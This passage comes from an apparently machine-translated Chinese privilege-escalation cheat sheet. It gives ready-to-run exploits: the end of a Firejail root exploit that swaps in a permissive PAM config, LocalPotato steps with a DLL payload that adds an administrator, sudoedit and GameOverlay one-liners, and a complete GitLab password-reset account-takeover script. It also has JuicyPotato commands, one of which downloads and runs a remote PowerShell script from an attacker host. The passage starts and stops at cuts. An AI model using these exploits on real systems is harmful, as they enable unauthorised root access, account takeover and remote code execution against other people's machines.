class="hljs-string">&quot;FIREJOIN_UNSHARED&quot;</span> not in os.environ:<br>    # First stage of execution, we first need to fork off a helper sandbox and<br>    <span class="hljs-meta"># an exploit environment</span><br>    checkSelfExecutable()<br>    helper_proc, join_file = createHelperSandbox()<br>    reexecUnshared(join_file)<br><br>    helper_proc.kill()<br>    helper_proc.wait()<br>    sys.<span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">else</span>:<br>    # We are in the sandbox environment, the suitable join file has been<br>    <span class="hljs-meta"># forwarded from the first stage via the environment</span><br>    join_file = os.environ[<span class="hljs-string">&quot;FIREJOIN_JOINFILE&quot;</span>]<br><br># We will make /proc/<span class="hljs-number">1</span>/ns/user point to this via a symlink<br>time_ns_src = <span class="hljs-string">&quot;/proc/self/ns/time&quot;</span><br><br># Make the firejail state directory writeable, we need to place a symlink to<br><span class="hljs-meta"># the fake join state file there</span><br>mountTmpFS(<span class="hljs-string">&quot;/run/firejail&quot;</span>)<br># Mount a tmpfs over the proc state directory of the init process, to place a<br><span class="hljs-meta"># symlink to a fake <span class="hljs-string">&quot;user&quot;</span> ns there that firejail thinks it is joining</span><br>try:<br>    mountTmpFS(<span class="hljs-string">&quot;/proc/1&quot;</span>)<br>except subprocess.CalledProcessError:<br>    # This is a special <span class="hljs-keyword">case</span> <span class="hljs-keyword">for</span> Fedora Linux where SELinux rules prevent us<br>    <span class="hljs-meta"># from mounting a tmpfs over proc directories.</span><br>    # We can still circumvent this by mounting a tmpfs over all of /proc, but<br>    <span class="hljs-meta"># we need to bind-mount a copy of our own time namespace first that we can</span><br>    <span class="hljs-meta"># symlink to.</span><br>    with open(<span class="hljs-string">&quot;/tmp/time&quot;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) as _:<br>        pass<br>    time_ns_src = <span class="hljs-string">&quot;/tmp/time&quot;</span><br>    bindMount(<span class="hljs-string">&quot;/proc/self/ns/time&quot;</span>, time_ns_src)<br>    mountTmpFS(<span class="hljs-string">&quot;/proc&quot;</span>)<br><br>FJ_MNT_ROOT = Path(<span class="hljs-string">&quot;/run/firejail/mnt&quot;</span>)<br><br># Create necessary intermediate directories<br>os.makedirs(FJ_MNT_ROOT)<br>os.makedirs(<span class="hljs-string">&quot;/proc/1/ns&quot;</span>)<br><br># Firejail expects to find the umask <span class="hljs-keyword">for</span> the <span class="hljs-string">&quot;container&quot;</span> here, <span class="hljs-keyword">else</span> it fails<br>with open(FJ_MNT_ROOT / <span class="hljs-string">&quot;umask&quot;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) as umask_fd:<br>    umask_fd.write(<span class="hljs-string">&quot;022&quot;</span>)<br><br># Create the symlink to the join file to pass Firejail<span class="hljs-number">&#x27;</span>s sanity check<br>os.symlink(join_file, FJ_MNT_ROOT / <span class="hljs-string">&quot;join&quot;</span>)<br># Since we cannot join our own user namespace again fake a user namespace that<br><span class="hljs-meta"># is actually a symlink to our own time namespace. This works since Firejail</span><br><span class="hljs-meta"># calls setns() without the nstype parameter.</span><br>os.symlink(time_ns_src, <span class="hljs-string">&quot;/proc/1/ns/user&quot;</span>)<br><br># The process joining our fake sandbox will still have normal user privileges,<br><span class="hljs-meta"># but it will be a member of the mount namespace under the control of *this*</span><br><span class="hljs-meta"># script while *still* being a member of the initial user namespace.</span><br># <span class="hljs-string">&#x27;no_new_privs&#x27;</span> won<span class="hljs-number">&#x27;</span>t be <span class="hljs-built_in">set</span> since Firejail takes over the settings of the<br><span class="hljs-meta"># target process.</span><br>#<br># This means we can invoke setuid-root binaries as usual but they will operate<br><span class="hljs-meta"># in a mount namespace under our control. To exploit this we need to adjust</span><br><span class="hljs-meta"># file system content in a way that a setuid-root binary grants us full</span><br><span class="hljs-meta"># root privileges. <span class="hljs-string">&#x27;su&#x27;</span> and <span class="hljs-string">&#x27;sudo&#x27;</span> are the most typical candidates for it.</span><br>#<br># The tools are hardened a bit these days and reject certain files <span class="hljs-keyword">if</span> not owned<br><span class="hljs-meta"># by root e.g. /etc/sudoers. There are various directions that could be taken,</span><br><span class="hljs-meta"># this one works pretty well though: Simply replacing the PAM configuration</span><br><span class="hljs-meta"># with one that will always grant access.</span><br>with tempfile.NamedTemporaryFile(<span class="hljs-string">&#x27;w&#x27;</span>) as tf:<br>    tf.write(<span class="hljs-string">&quot;auth sufficient pam_permit.so\n&quot;</span>)<br>    tf.write(<span class="hljs-string">&quot;account sufficient pam_unix.so\n&quot;</span>)<br>    tf.write(<span class="hljs-string">&quot;session sufficient pam_unix.so\n&quot;</span>)<br><br>    # Be agnostic about the PAM config file location in /etc or /usr/etc<br>    <span class="hljs-keyword">for</span> pamd in (<span class="hljs-string">&quot;/etc/pam.d&quot;</span>, <span class="hljs-string">&quot;/usr/etc/pam.d&quot;</span>):<br>        <span class="hljs-keyword">if</span> not os.path.isdir(pamd):<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">for</span> service in (<span class="hljs-string">&quot;su&quot;</span>, <span class="hljs-string">&quot;sudo&quot;</span>):<br>            service = Path(pamd) / service<br>            <span class="hljs-keyword">if</span> not service.exists():<br>                <span class="hljs-keyword">continue</span><br>            # Bind mount over new <span class="hljs-string">&quot;helpful&quot;</span> PAM config over the original<br>            bindMount(tf.name, service)<br><br>print(f<span class="hljs-string">&quot;You can now run &#x27;firejail --join=&#123;os.getpid()&#125;&#x27; in another terminal to obtain a shell where &#x27;sudo su -&#x27; should grant you a root shell.&quot;</span>)<br><br><span class="hljs-keyword">while</span> True:<br>    line = sys.<span class="hljs-built_in">stdin</span>.readline()<br>    <span class="hljs-keyword">if</span> not line:<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>

<h4 id="第一航站楼"><a href="#第一航站楼" class="headerlink" title="第一航站楼"></a>第一航站楼</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">./firejoin_py.bin<br>现在，您可以在另一个终端中运行“firejail--join=<span class="hljs-number">1193982</span>”来获得一个shell，其中“sudo su-”应该授予您一个根shell。<br></code></pre></td></tr></table></figure>

<h4 id="第二航站楼"><a href="#第二航站楼" class="headerlink" title="第二航站楼"></a>第二航站楼</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">firejail --join=<span class="hljs-number">193982</span><br>su<br></code></pre></td></tr></table></figure>

<h4 id="CVE-2023-21746：Windows-NTLM-EoP-LocalPotato-LPE"><a href="#CVE-2023-21746：Windows-NTLM-EoP-LocalPotato-LPE" class="headerlink" title="CVE-2023-21746：Windows NTLM EoP LocalPotato LPE"></a>CVE-2023-21746：Windows NTLM EoP LocalPotato LPE</h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/decoder-it/LocalPotato">https://github.com/decoder-it/LocalPotato</a></p>
</blockquote>
<blockquote>
<p>[<a target="_blank" rel="noopener" href="https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc]">https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc]</a>(<a target="_blank" rel="noopener" href="https://github.com/blackarrowsec/redteam-research/tree/master/LPE">https://github.com/blackarrowsec/redteam-research/tree/master/LPE</a> via StorSvc)</p>
</blockquote>
<p>修改以下文件并构建解决方案。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">StorSvc\RpcClient\RpcClient\storsvc_c.c<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(_M_AMD64)</span><br><br><span class="hljs-comment">//#define WIN10</span><br><span class="hljs-comment">//#define WIN11</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> WIN2019</span><br><span class="hljs-comment">//#define WIN2022</span><br></code></pre></td></tr></table></figure>

<p>修改以下文件并构建解决方案。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">StorSvc\SprintCSP\SprintCSP\main.c<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">DoStuff</span><span class="hljs-params">()</span> &#123;<br><br>    <span class="hljs-comment">// Replace all this code by your payload</span><br>    STARTUPINFO si = &#123; <span class="hljs-keyword">sizeof</span>(STARTUPINFO) &#125;;<br>    PROCESS_INFORMATION pi;<br>    CreateProcess(<span class="hljs-string">L&quot;c:\\windows\\system32\\cmd.exe&quot;</span>,<span class="hljs-string">L&quot; /C net localgroup administrators user /add&quot;</span>,<br>        <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, FALSE, NORMAL_PRIORITY_CLASS, <span class="hljs-literal">NULL</span>, <span class="hljs-string">L&quot;C:\\Windows&quot;</span>, &amp;si, &amp;pi);<br><br>    CloseHandle(pi.hProcess);<br>    CloseHandle(pi.hThread);<br><br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>paths</code>首先从 中获取<code>environment</code>，然后使用<code>LocalPotato</code>来放置<code>malicious DLL</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">reg query <span class="hljs-string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment&quot;</span> -v Path<br>LocalPotato.exe -i SprintCSP.dll -o \Windows\System32\SprintCSP.dll<br></code></pre></td></tr></table></figure>

<p>至少<code>StorSvc</code>通过触发<code>RpcClient.exe</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">.\RpcClient.exe<br></code></pre></td></tr></table></figure>

<h4 id="CVE-2023-22809：Sudo-绕过"><a href="#CVE-2023-22809：Sudo-绕过" class="headerlink" title="CVE-2023-22809：Sudo 绕过"></a>CVE-2023-22809：Sudo 绕过</h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://medium.com/@dev.nest/how-to-bypass-sudo-exploit-cve-2023-22809-vulnerability-296ef10a1466">https://medium.com/@dev.nest/how-to-bypass-sudo-exploit-cve-2023-22809-vulnerability-296ef10a1466</a></p>
</blockquote>
<h5 id="先决条件-4"><a href="#先决条件-4" class="headerlink" title="先决条件"></a>先决条件</h5><ul>
<li>Sudo 版本需要 ≥ 1.8 且 &lt; 1.9.12p2。</li>
<li>对系统上至少一个需要 root 访问权限的文件的 Sudo 访问权限受到限制。</li>
</ul>
<h5 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">test ALL=(ALL:ALL) NOPASSWD: sudoedit /etc/motd<br></code></pre></td></tr></table></figure>

<h5 id="开发-1"><a href="#开发-1" class="headerlink" title="开发"></a>开发</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">EDITOR=<span class="hljs-string">&quot;vi -- /etc/passwd&quot;</span> sudoedit /etc/motd<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">sudoedit /etc/motd<br></code></pre></td></tr></table></figure>

<h4 id="CVE-2023-32629、CVE-2023-2640：GameOverlay-Ubuntu-内核利用-LPE（0-天）"><a href="#CVE-2023-32629、CVE-2023-2640：GameOverlay-Ubuntu-内核利用-LPE（0-天）" class="headerlink" title="CVE-2023-32629、CVE-2023-2640：GameOverlay Ubuntu 内核利用 LPE（0 天）"></a>CVE-2023-32629、CVE-2023-2640：GameOverlay Ubuntu 内核利用 LPE（0 天）</h4><ul>
<li>Linux ubuntu2204 5.19.0-46-通用</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">unshare -rm sh -c <span class="hljs-string">&quot;mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*;&quot;</span> &amp;&amp; u/python3 -c <span class="hljs-string">&#x27;import os;os.setuid(0);os.system(&quot;id&quot;)&#x27;</span><br></code></pre></td></tr></table></figure>

<h4 id="CVE-2023-4911：Looney-可调-LPE"><a href="#CVE-2023-4911：Looney-可调-LPE" class="headerlink" title="CVE-2023-4911：Looney 可调 LPE"></a>CVE-2023-4911：Looney 可调 LPE</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">python3 gen_libc.py <br>[*] <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>    Arch:     amd64<span class="hljs-number">-64</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      PIE enabled<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">gcc -o <span class="hljs-built_in">exp</span> <span class="hljs-built_in">exp</span>.c<br>./<span class="hljs-built_in">exp</span><br></code></pre></td></tr></table></figure>

<h4 id="CVE-2023-7028：GitLab-帐户接管"><a href="#CVE-2023-7028：GitLab-帐户接管" class="headerlink" title="CVE-2023-7028：GitLab 帐户接管"></a>CVE-2023-7028：GitLab 帐户接管</h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/V1lu0/CVE-2023-7028">https://github.com/V1lu0/CVE-2023-7028</a></p>
</blockquote>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/Vozec/CVE-2023-7028">https://github.com/Vozec/CVE-2023-7028</a></p>
</blockquote>
<h3 id="概念验证"><a href="#概念验证" class="headerlink" title="概念验证"></a>概念验证</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">user[email][]=valid@email.com&amp;user[email][]=attacker@email.com<br></code></pre></td></tr></table></figure>

<h3 id="来自-TryHackMe-的修改后的-PoC"><a href="#来自-TryHackMe-的修改后的-PoC" class="headerlink" title="来自 TryHackMe 的修改后的 PoC"></a>来自 TryHackMe 的修改后的 PoC</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs c">import requests<br>import argparse<br>from urllib.parse import urlparse, urlencode<br>from random import choice<br>from time import sleep<br>import re<br>requests.packages.urllib3.disable_warnings()<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CVE_2023_7028</span>:</span><br>    def __init__(self, url, target, evil=None):<br>        self.use_temp_mail = False<br>        self.url = urlparse(url)<br>        self.target = target<br>        self.evil = evil<br>        self.s = requests.session()<br><br>    def get_csrf_token(self):<br>        try:<br>            print(<span class="hljs-string">&#x27;[DEBUG] Getting authenticity_token ...&#x27;</span>)<br>            html = self.s.get(f<span class="hljs-number">&#x27;</span>&#123;self.url.scheme&#125;:<span class="hljs-comment">//&#123;self.url.netloc&#125;/users/password/new&#x27;, verify=False).text</span><br>            regex = r<span class="hljs-number">&#x27;</span>&lt;meta name=<span class="hljs-string">&quot;csrf-token&quot;</span> content=<span class="hljs-string">&quot;(.*?)&quot;</span> /&gt;&#x27;<br>            token = re.findall(regex, html)[<span class="hljs-number">0</span>]<br>            print(f<span class="hljs-number">&#x27;</span>[DEBUG] authenticity_token = &#123;token&#125;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            return token</span><br><span class="hljs-string">        except Exception:</span><br><span class="hljs-string">            print(&#x27;</span>[DEBUG] Failed ... quitting<span class="hljs-number">&#x27;</span>)<br>            <span class="hljs-keyword">return</span> None<br><br>    def ask_reset(self):<br>        token = self.get_csrf_token()<br>        <span class="hljs-keyword">if</span> not token:<br>            <span class="hljs-keyword">return</span> False<br><br>        query_string = urlencode(&#123;<br>            <span class="hljs-string">&#x27;authenticity_token&#x27;</span>: token,<br>            <span class="hljs-string">&#x27;user[email][]&#x27;</span>: [self.target, self.evil]<br>        &#125;, doseq=True)<br><br>        head = &#123;<br>            <span class="hljs-string">&#x27;Origin&#x27;</span>: f<span class="hljs-number">&#x27;</span>&#123;self.url.scheme&#125;:<span class="hljs-comment">//&#123;self.url.netloc&#125;&#x27;,</span><br>            <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#x27;</span>,<br>            <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>            <span class="hljs-string">&#x27;Referer&#x27;</span>: f<span class="hljs-number">&#x27;</span>&#123;self.url.scheme&#125;:<span class="hljs-comment">//&#123;self.url.netloc&#125;/users/password/new&#x27;,</span><br>            <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;close&#x27;</span>,<br>            <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;en-US,en;q=0.5&#x27;</span>,<br>            <span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>: <span class="hljs-string">&#x27;gzip, deflate, br&#x27;</span><br>        &#125;<br><br>        print(<span class="hljs-string">&#x27;[DEBUG] Sending reset password request&#x27;</span>)<br>        html = self.s.post(f<span class="hljs-number">&#x27;</span>&#123;self.url.scheme&#125;:<span class="hljs-comment">//&#123;self.url.netloc&#125;/users/password&#x27;,</span><br>                           data=query_string,<br>                           headers=head,<br>                           verify=False).text<br>        sended = <span class="hljs-string">&#x27;If your email address exists in our database&#x27;</span> in html<br>        <span class="hljs-keyword">if</span> sended:<br>            print(f<span class="hljs-number">&#x27;</span>[DEBUG] Emails sent to &#123;self.target&#125; and &#123;self.evil&#125; !<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">            print(f&#x27;</span>Flag value: &#123;bytes.fromhex(<span class="hljs-string">&quot;6163636f756e745f6861636b2364&quot;</span>).decode()&#125;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">        else:</span><br><span class="hljs-string">            print(&#x27;</span>[DEBUG] Failed ... quitting<span class="hljs-number">&#x27;</span>)<br>        <span class="hljs-keyword">return</span> sended<br><br>def parse_args():<br>    parser = argparse.ArgumentParser(add_help=True, description=<span class="hljs-string">&#x27;This tool automates CVE-2023-7028 on gitlab&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-u&quot;</span>, <span class="hljs-string">&quot;--url&quot;</span>, dest=<span class="hljs-string">&quot;url&quot;</span>, type=str, required=True, help=<span class="hljs-string">&quot;Gitlab url&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-t&quot;</span>, <span class="hljs-string">&quot;--target&quot;</span>, dest=<span class="hljs-string">&quot;target&quot;</span>, type=str, required=True, help=<span class="hljs-string">&quot;Target email&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-e&quot;</span>, <span class="hljs-string">&quot;--evil&quot;</span>, dest=<span class="hljs-string">&quot;evil&quot;</span>, <span class="hljs-keyword">default</span>=None, type=str, required=False, help=<span class="hljs-string">&quot;Evil email&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;--password&quot;</span>, dest=<span class="hljs-string">&quot;password&quot;</span>, <span class="hljs-keyword">default</span>=None, type=str, required=False, help=<span class="hljs-string">&quot;Password&quot;</span>)<br>    <span class="hljs-keyword">return</span> parser.parse_args()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    args = parse_args()<br>    exploit = CVE_2023_7028(<br>        url=args.url,<br>        target=args.target,<br>        evil=args.evil<br>    )<br>    <span class="hljs-keyword">if</span> not exploit.ask_reset():<br>        <span class="hljs-built_in">exit</span>()<br></code></pre></td></tr></table></figure>

<h3 id="执行-2"><a href="#执行-2" class="headerlink" title="执行"></a>执行</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">python3 exploit.py -u http:<span class="hljs-comment">//&lt;RHOST&gt; -t &lt;EMAIL&gt; -e &lt;EMAIL&gt;</span><br></code></pre></td></tr></table></figure>

<h4 id="GodPotato-NET4-exe"><a href="#GodPotato-NET4-exe" class="headerlink" title="GodPotato-NET4.exe"></a>GodPotato-NET4.exe</h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/BeichenDream/GodPotato">https://github.com/BeichenDream/GodPotato</a></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">.\GodPotato-NET4.exe -cmd <span class="hljs-string">&#x27;&lt;COMMAND&gt;&#x27;</span><br></code></pre></td></tr></table></figure>

<h4 id="juicy-potato"><a href="#juicy-potato" class="headerlink" title="juicy-potato"></a>juicy-potato</h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a></p>
</blockquote>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://ohpe.it/juicy-potato/CLSID/">http://ohpe.it/juicy-potato/CLSID/</a></p>
</blockquote>
<h5 id="获取CLSID-ps1"><a href="#获取CLSID-ps1" class="headerlink" title="获取CLSID.ps1"></a>获取CLSID.ps1</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;#<br>This script extracts CLSIDs and AppIDs related to LocalService.DESCRIPTION<br>Then exports to CSV<br>#&gt;<br><br>$ErrorActionPreference = <span class="hljs-string">&quot;Stop&quot;</span><br><br>New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT<br><br>Write-Output <span class="hljs-string">&quot;Looking for CLSIDs&quot;</span><br>$CLSID = @()<br>Foreach($ID in (Get-ItemProperty HKCR:\clsid\* | select-object AppID,@&#123;N=<span class="hljs-string">&#x27;CLSID&#x27;</span>; E=&#123;$_.pschildname&#125;&#125;))&#123;<br>    <span class="hljs-keyword">if</span> ($ID.appid -ne $null)&#123;<br>        $CLSID += $ID<br>    &#125;<br>&#125;<br><br>Write-Output <span class="hljs-string">&quot;Looking for APIDs&quot;</span><br>$APPID = @()<br>Foreach($AID in (Get-ItemProperty HKCR:\appid\* | select-object localservice,@&#123;N=<span class="hljs-string">&#x27;AppID&#x27;</span>; E=&#123;$_.pschildname&#125;&#125;))&#123;<br>    <span class="hljs-keyword">if</span> ($AID.LocalService -ne $null)&#123;<br>        $APPID += $AID<br>    &#125;<br>&#125;<br><br>Write-Output <span class="hljs-string">&quot;Joining CLSIDs and APIDs&quot;</span><br>$RESULT = @()<br>Foreach ($app in $APPID)&#123;<br>    Foreach ($CLS in $CLSID)&#123;<br>        <span class="hljs-keyword">if</span>($CLS.AppId -eq $app.AppID)&#123;<br>            $RESULT += New-Object psobject -Property @&#123;<br>                AppId    = $app.AppId<br>                LocalService = $app.LocalService<br>                CLSID = $CLS.CLSID<br>            &#125;<br><br>            <span class="hljs-keyword">break</span><br>        &#125;<br>    &#125;<br>&#125;<br><br>$RESULT = $RESULT | Sort-Object LocalService<br><br># Preparing to Output<br>$OS = (Get-WmiObject -Class Win32_OperatingSystem | ForEach-Object -MemberName Caption).Trim() -Replace <span class="hljs-string">&quot;Microsoft &quot;</span>, <span class="hljs-string">&quot;&quot;</span><br>$TARGET = $OS -Replace <span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;_&quot;</span><br><br># Make target folder<br>New-Item -ItemType Directory -Force -Path .\$TARGET<br><br># Output in a CSV<br>$RESULT | Export-Csv -Path <span class="hljs-string">&quot;.\$TARGET\CLSIDs.csv&quot;</span> -Encoding ascii -NoTypeInformation<br><br># Export CLSIDs <span class="hljs-built_in">list</span><br>$RESULT | Select CLSID -ExpandProperty CLSID | Out-File -FilePath <span class="hljs-string">&quot;.\$TARGET\CLSID.list&quot;</span> -Encoding ascii<br><br># Visual Table<br>$RESULT | ogv<br></code></pre></td></tr></table></figure>

<h5 id="执行-3"><a href="#执行-3" class="headerlink" title="执行"></a>执行</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">.\JuicyPotato.exe -l <span class="hljs-number">1337</span> -c <span class="hljs-string">&quot;&#123;4991d34b-80a1-4291-83b6-3328366b9097&#125;&quot;</span> -p C:\Windows\system32\cmd.exe -a <span class="hljs-string">&quot;/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString(&#x27;http://&lt;LHOST&gt;/&lt;FILE&gt;.ps1&#x27;)&quot;</span> -t *<br></code></pre></td></tr></table></figure>

<h4 id="JuicyPotatoNG-exe"><a href="#JuicyPotatoNG-exe" class="headerlink" title="JuicyPotatoNG.exe"></a>JuicyPotatoNG.exe</h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/antonioCoco/JuicyPotatoNG">https://github.com/antonioCoco/JuicyPotatoNG</a></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">.\JuicyPotatoNG.exe -t * -p <span class="hljs-string">&quot;C:\Windows\system32\cmd.exe&quot;</span> -a <span class="hljs-string">&quot;/c whoami&quot;</span><br></code></pre></td></tr></table></figure>

<h4 id="MySQL-4-x-5-0-用户定义函数（UDF）动态库（二）LPE"><a href="#MySQL-4-x-5-0-用户定义函数（UDF）动态库（二）LPE" class="headerlink" title="MySQL 4.x&#x2F;5.0 用户定义函数（UDF）动态库（二）LPE"></a>MySQL 4.x&#x2F;5.0 用户定义函数（UDF）动态库（二）LPE</h4><blockquote>
